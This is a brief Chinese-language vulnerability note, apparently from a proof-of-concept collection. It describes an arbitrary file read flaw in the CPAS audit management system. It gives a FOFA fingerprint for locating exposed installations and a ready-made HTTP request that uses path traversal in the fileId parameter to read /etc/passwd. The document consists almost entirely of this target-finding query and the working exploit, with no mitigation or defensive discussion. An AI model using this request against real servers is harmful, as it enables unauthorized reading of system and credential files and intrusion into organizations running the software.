# CPAS审计管理系统存在任意文件读取漏洞

CPAS审计管理系统存在任意文件读取漏洞

## fofa

```javascript
icon_hash="-58141038"
```

## poc

```javascript
GET /cpasm4/plugInManController/downPlugs?fileId=../../../../etc/passwd&fileName= HTTP/1.1
Host: 
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
```

